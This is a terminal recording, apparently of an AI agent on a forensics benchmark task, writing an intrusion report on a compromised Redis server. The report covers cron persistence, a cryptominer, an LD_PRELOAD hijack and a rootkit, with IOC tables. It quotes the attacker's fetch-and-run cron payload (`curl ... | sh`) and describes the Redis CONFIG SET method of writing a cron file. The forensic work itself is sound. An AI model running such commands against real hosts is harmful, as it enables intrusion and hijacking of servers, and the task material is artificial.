[133.355866, "i", "cat << 'EOF' > /app/intrusion-report.md\n# Post-Compromise Intrusion Forensic Report\n\n## Executive Summary\nOn host `redis-prod-01`, an external threat actor exploited an unauthenticated Redis instance bound to all interfaces (`0.0.0.0`) with protected mode disabled (`/disk/etc/redis/redis.conf:3`). The attacker executed commands via Redis `CONFIG SET` commands (`/sas/cti/advisory.txt:13`), established persistence via root cron job (`/disk/var/spool/cron/crontabs/root:5`), deployed an XMRig cryptominer (`/disk/tmp/.redis/kdevtmpfsi`), and installed stealth persistence via userland `LD_PRELOAD` dynamic linker hijacking (`/disk/etc/ld.so.preload:1`) and a loadable module kernel rootkit sample (`/disk/tmp/.redis/exp.so`).\n\n---\n\n## Detailed Attack Chain & Technical Analysis\n\n### 1. Initial Access & External Access (ATT&CK T1133)\n- **Vector**: Unauthenticated remote access to Redis service on TCP port 6379.\n- **Evidence**: `/disk/etc/redis/redis.conf:3` specifies `protected-mode no`, `bind 0.0.0.0`, and `no password set` (`/disk/etc/redis/redis.conf:3`).\n- **Attribution & Origin**: Threat actor IP `198.51.100.170` (`/sas/cti/advisory.txt:5`, `/disk/var/lib/.cache/.wiped.bin:1`).\n\n### 2. Execution (ATT&CK T1059.004)\n- **Vector**: Unix shell execution via Redis `CONFIG SET` commands (`/sas/cti/advisory.txt:13`).\n- **Details**: The actor modified Redis configuration dynamically to point the working directory to `/var/spool/cron/crontabs` and dbfilename to `root`, writing a cron file payload to disk.\n\n### 3. Resource Hijacking / Impact (ATT&CK T1496)\n- **Vector**: Cryptomining activity.\n- **Evidence**: Binary dropped at `/disk/tmp/.redis/kdevtmpfsi` (`/sas/alerts.json:2`).\n- **Properties**: SHA-256 `f32a21087eb4c89ca20359debcb989b46047d8237507fabf63314cbbadb4481c` (`/disk/tmp/.redis/kdevtmpfsi`).\n- **Target Pool**: `stratum+tcp://xmr.redis.evil:3333` (`/sas/cti/advisory.txt:19`).\n- **Wallet**: `4A00000000000000000031c7d95fb9f3` (`/sas/cti/advisory.txt:20`).\n\n### 4. Cron Persistence (ATT&CK T1053.003)\n- **Vector**: Cron job persistence.\n- **Evidence**: Entry in `/disk/var/spool/cron/crontabs/root:5` (`/sas/alerts.json:10`).\n- **Payload**: Beaconing command `curl http://198.51.100.170/x | sh` (`/disk/var/spool/cron/crontabs/root:5`).\n\n### 5. Dynamic Linker Hijacking & Stealth Persistence (ATT&CK T1574.006)\n- **Vector**: `LD_PRELOAD` shared object injection and loadable module rootkit.\n- **Evidence**: \n  - `/disk/etc/ld.so.preload:1` references `/lib/.hide.so` (SHA-256: `a2ea2d39f7a0c2a2ea9e2d5bd342667d014d8a974f4f6c8b08a731ddc250e480`).\n  - `/disk/tmp/.redis/exp.so` (SHA-256: `29b2bcaadbbae01496158b67b95b8fe3457573eb7e332da3516aab24ca1e5350`).\n- **Detection Status**: **SILENT** — not captured by SAS security alerts (`/sas/alerts.json:1`).\n\n### 6. Anti-Forensics & Wiped Binary Evidence\n- **Evidence**: Wiped binary trace found at `/disk/var/lib/.cache/.wiped.bin:1` (SHA-256: `7b454340fed86d2621bc00c334ac5e76b54c3e1f7df9daf6fdefef1b75f53c14`).\n- **Content**: Contains recovered C2 beacon information for domain `update-redis.example.cn` and IP `198.51.100.170` (`/disk/var/lib/.cache/.wiped.bin:1`).\n\n---\n\n## Indicators of Compromise & Key Entities\n\n| Entity Type | Indicator | Re-fanged Value | Evidence Citation |\n|---|---|---|---|\n| IP Address | Attacker Source IP | `198.51.100.170` | `/sas/cti/advisory.txt:5` |\n| Domain | C2 Domain | `update-redis.example.cn` | `/sas/cti/advisory.txt:18` |\n| Network Pool | Mining Pool | `stratum+tcp://xmr.redis.evil:3333` | `/sas/cti/advisory.txt:19` |\n| Crypto Wallet | Monero Wallet | `4A00000000000000000031c7d95fb9f3` | `/sas/cti/advisory.txt:20` |\n| File Path | Cryptominer Binary | `/tmp/.redis/kdevtmpfsi` | `/disk/tmp/.redis/kdevtmpfsi` |\n| File Path | Rootkit / Module Sample | `/tmp/.redis/exp.so` | `/disk/tmp/.redis/exp.so` |\n| File Path | LD_PRELOAD Configuration | `/etc/ld.so.preload` | `/disk/etc/ld.so.preload:1` |\n| File Path | Cron Persistence File | `/var/spool/cron/crontabs/root` | `/disk/var/spool/cron/crontabs/root:5` |\n| File Path | Wiped Cache Fragment | `/var/lib/.cache/.wiped.bin` | "]
[133.355899, "i", "`/disk/var/lib/.cache/.wiped.bin:1` |\n\n---\n\n## SAS Alert Feed Gap Analysis\n\n| Finding | Detected by SAS Feed? | Citation |\n|---|---|---|\n| Miner Process (`/tmp/.redis/kdevtmpfsi`) | Yes (`ALERT-01`) | `/sas/alerts.json:2` |\n| Root Cron Job (`/var/spool/cron/crontabs/root`) | Yes (`ALERT-02`) | `/sas/alerts.json:10` |\n| Redis Misconfiguration (`/etc/redis/redis.conf`) | Yes (`ALERT-03`) | `/sas/alerts.json:18` |\n| Dynamic Linker Hijack (`/etc/ld.so.preload`) | **NO (Silent)** | `/disk/etc/ld.so.preload:1` |\n| Staged Module Rootkit (`/tmp/.redis/exp.so`) | **NO (Silent)** | `/disk/tmp/.redis/exp.so` |\n| Wiped Anti-Forensic Artifact (`/var/lib/.cache/.wiped.bin`) | **NO (Silent)** | `/disk/var/lib/.cache/.wiped.bin:1` |\nEOF\n"]
[133.358936, "o", "cat << 'EOF' > /app/intrusion-report.md\r\n\u001b[?2004l\r\u001b[?2004h> # Post-Compromise Intrusion Forensic Report\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ## Executive Summary\r\n\u001b[?2004l\r\u001b[?2004h> On host `redis-prod-01`, an external threat actor exploited an unauthenticated Redis instance bound to all interfaces (`0.0.0.0`) with protected mode disabled (`/disk/etc/redis/redis.conf:3`). The attacker executed commands via Redis `CONFIG SET` commands (`/sas/cti/advisory.txt:13`), established persistence via root cron job (`/disk/var/spool/cron/crontabs/root:5`), deployed an XMRig cryptominer (`/disk/tmp/.redis/kdevtmpfsi`), and installed stealth persistence via userland `LD_PRELOAD` dynamic linker hijacking (`/disk/etc/ld.so.preload:1`) and a loadable module kernel rootkit sample (`/disk/tmp/.redis/exp.so`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\rE\u001b[?2004h> ---\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ## Detailed Attack Chain & Technical Analysis\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### 1. Initial Access & External Access (ATT&CK T1133)\r\n\u001b[?2004l\r\u001b[?2004h> - **Vector**: Unauthenticated remote access to Redis service on TCP port 6379.\r\n\u001b[?2004l\r\u001b[?2004h> - **Evidence**: `/disk/etc/redis/redis.conf:3` specifies `protected-mode no`, `bind 0.0.0.0`, and `no password set` (`/disk/etc/redis/redis.conf:3`).\r\n\u001b[?2004l\r\u001b[?2004h> - **Attribution & Origin**: Threat actor IP `198.51.100.170` (`/sas/cti/advisory.txt:5`, `/disk/var/lib/.cache/.wiped.bin:1`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### 2. Execution (ATT&CK T1059.004)\r\n\u001b[?2004l\r\u001b[?2004h> - **Vector**: Unix shell execution via Redis `CONFIG SET` commands (`/sas/cti/advisory.txt:13`).\r\n\u001b[?2004l\r\u001b[?2004h> - **Details**: The actor modified Redis configuration dynamically to point the working directory to `/var/spool/cron/crontabs` and dbfilename to `root`, writing a cron file payload to disk.\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### 3. Resource Hijacking / Impact (ATT&CK T1496)\r\n\u001b[?2004l\r\u001b[?2004h> "]
